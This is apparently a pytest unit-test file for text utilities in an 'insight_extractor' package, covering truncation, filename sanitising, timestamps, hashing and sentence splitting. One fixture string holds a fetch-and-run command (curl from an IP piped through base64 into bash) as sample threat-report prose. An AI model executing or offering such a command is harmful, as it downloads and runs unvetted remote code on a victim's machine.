"""Unit tests for insight_extractor.utils — previously untested module."""

from __future__ import annotations

from datetime import UTC, datetime

from insight_extractor.utils import (
    compute_text_hash,
    format_timestamp,
    sanitize_filename,
    split_sentences,
    truncate_text,
)


class TestTruncateText:
    """truncate_text keeps short strings intact and trims long ones."""

    def test_short_string_unchanged(self) -> None:
        assert truncate_text("hello", max_length=120) == "hello"

    def test_exactly_max_length(self) -> None:
        s = "x" * 120
        assert truncate_text(s, max_length=120) == s

    def test_long_string_truncated(self) -> None:
        s = "a" * 200
        result = truncate_text(s, max_length=50)
        assert len(result) == 50
        assert result.endswith("...")

    def test_custom_suffix(self) -> None:
        result = truncate_text("hello world", max_length=8, suffix="…")
        assert result.endswith("…")
        assert len(result) == 8

    def test_empty_string(self) -> None:
        assert truncate_text("", max_length=10) == ""


class TestSanitizeFilename:
    """sanitize_filename strips characters unsafe in file paths."""

    def test_alphanumeric_unchanged(self) -> None:
        assert sanitize_filename("report2026") == "report2026"

    def test_spaces_become_underscores(self) -> None:
        assert sanitize_filename("my report") == "my_report"

    def test_special_chars_removed(self) -> None:
        result = sanitize_filename("foo/bar:baz*qux")
        assert "/" not in result
        assert ":" not in result
        assert "*" not in result

    def test_leading_trailing_whitespace_stripped(self) -> None:
        result = sanitize_filename("  report  ")
        assert not result.startswith(" ")
        assert not result.endswith(" ")

    def test_empty_string(self) -> None:
        assert sanitize_filename("") == ""


class TestFormatTimestamp:
    """format_timestamp returns ISO 8601 UTC strings ending in Z."""

    def test_returns_string(self) -> None:
        ts = format_timestamp()
        assert isinstance(ts, str)

    def test_ends_with_z(self) -> None:
        ts = format_timestamp()
        assert ts.endswith("Z")

    def test_parses_as_iso(self) -> None:
        ts = format_timestamp()
        # Should round-trip through fromisoformat
        dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
        assert dt.tzinfo is not None

    def test_explicit_datetime(self) -> None:
        dt = datetime(2026, 1, 15, 10, 30, 0, tzinfo=UTC)
        ts = format_timestamp(dt)
        assert "2026-01-15" in ts
        assert ts.endswith("Z")

    def test_none_uses_now(self) -> None:
        before = datetime.now(UTC)
        ts = format_timestamp(None)
        after = datetime.now(UTC)
        parsed = datetime.fromisoformat(ts.replace("Z", "+00:00"))
        assert before <= parsed <= after


class TestComputeTextHash:
    """compute_text_hash produces stable, truncated SHA-256 hex digests."""

    def test_returns_string(self) -> None:
        h = compute_text_hash("hello")
        assert isinstance(h, str)

    def test_default_length_16(self) -> None:
        h = compute_text_hash("hello")
        assert len(h) == 16

    def test_custom_length(self) -> None:
        h = compute_text_hash("hello", length=8)
        assert len(h) == 8

    def test_deterministic(self) -> None:
        assert compute_text_hash("same input") == compute_text_hash("same input")

    def test_different_inputs_differ(self) -> None:
        assert compute_text_hash("input A") != compute_text_hash("input B")

    def test_empty_string(self) -> None:
        h = compute_text_hash("")
        assert len(h) == 16
        assert all(c in "0123456789abcdef" for c in h)


class TestSplitSentences:
    """split_sentences keeps wrapped prose whole and Markdown lines separate."""

    def test_empty_and_markup_only_text(self) -> None:
        assert split_sentences("") == []
        assert split_sentences("  \n\t\n") == []
        assert split_sentences("|---|:---:|\n┌────┐\n└────┘\n---") == []

    def test_hard_wrapped_prose_is_joined_then_split_on_punctuation(self) -> None:
        text = "The group exploited a flaw\n    to gain access. Lateral movement\nfollowed!\nDone?"
        assert split_sentences(text) == [
            "The group exploited a flaw to gain access.",
            "Lateral movement followed!",
            "Done?",
        ]

    def test_blank_line_ends_a_paragraph(self) -> None:
        assert split_sentences("Executive summary\n\nRansomware hit ESXi hosts.") == [
            "Executive summary",
            "Ransomware hit ESXi hosts.",
        ]

    def test_table_rows_are_single_units_without_frames(self) -> None:
        text = (
            "# | Title | Turns\n"
            "--|-------|------\n"
            " 9 | Can Grok allow firewall changes? (research) | 1\n"
            "| 10 | Tech News AM digest |\n"
            "│  Coverage: 2026-01-26 through 2026-07-04. More text.   │\n"
        )
        assert split_sentences(text) == [
            "# | Title | Turns",
            "9 | Can Grok allow firewall changes? (research) | 1",
            "10 | Tech News AM digest",
            "Coverage: 2026-01-26 through 2026-07-04. More text.",
        ]

    def test_pipes_in_prose_are_not_table_rows(self) -> None:
        text = (
            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and\n"
            "then deleted itself. IOC summary: ALPHV | BlackCat | LockBit. The first\n"
            "two share code.\r\n"
            "| Actor | CVE |\r\n"
            "|---|:---:|\r\n"
            "| ALPHV | CVE-2024-1234 |\r\n"
            "LockBit | CVE-2023-4966 | still tracked. Another row\r\n"
            "\r\n"
            "After the table. Done."
        )
        assert split_sentences(text) == [
            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and then "
            "deleted itself.",
            "IOC summary: ALPHV | BlackCat | LockBit.",
            "The first two share code.",
            "Actor | CVE",
            "ALPHV | CVE-2024-1234",
            "LockBit | CVE-2023-4966 | still tracked. Another row",
            "After the table.",
            "Done.",
        ]

    def test_headings_lists_and_quotes_start_new_units(self) -> None:
        text = (
            "### Insight 47\n"
            "> Burnout and rage-quitting\n"
            "- Score: `1`\n"
            "- A long bullet that wraps\n"
            "  onto a second line. Then a new sentence.\n"
            "2. Numbered item\n"
            "Plain prose after the list"
        )
        assert split_sentences(text) == [
            "### Insight 47",
            "> Burnout and rage-quitting",
            "- Score: `1`",
            "- A long bullet that wraps onto a second line.",
            "Then a new sentence.",
            "2. Numbered item Plain prose after the list",
        ]

    def test_single_pipe_and_year_prefix_stay_prose(self) -> None:
        text = "Contact: ransom@darkmail.onion | BTC wallet\n2026. Data exfiltrated."
        assert split_sentences(text) == [
            "Contact: ransom@darkmail.onion | BTC wallet 2026.",
            "Data exfiltrated.",
        ]

    def test_ordinals_and_abbreviations_do_not_end_sentences(self) -> None:
        text = (
            "> 4.\tAnthropomorphic patterns appear. Google told the U.S. government, "
            "e.g. regulators, about good vs. evil framing. Dr. Smith agreed."
        )
        assert split_sentences(text) == [
            "> 4. Anthropomorphic patterns appear.",
            "Google told the U.S. government, e.g. regulators, about good vs. evil framing.",
            "Dr. Smith agreed.",
        ]

    def test_units_and_sentence_final_abbreviations_still_split(self) -> None:
        text = (
            "The C2 beacon fires every 500 ms. The operator then pivots. Timeouts were "
            "200 MS. Most victims were in the U.S. The group later expanded via St. Louis."
        )
        assert split_sentences(text) == [
            "The C2 beacon fires every 500 ms.",
            "The operator then pivots.",
            "Timeouts were 200 MS.",
            "Most victims were in the U.S.",
            "The group later expanded via St. Louis.",
        ]
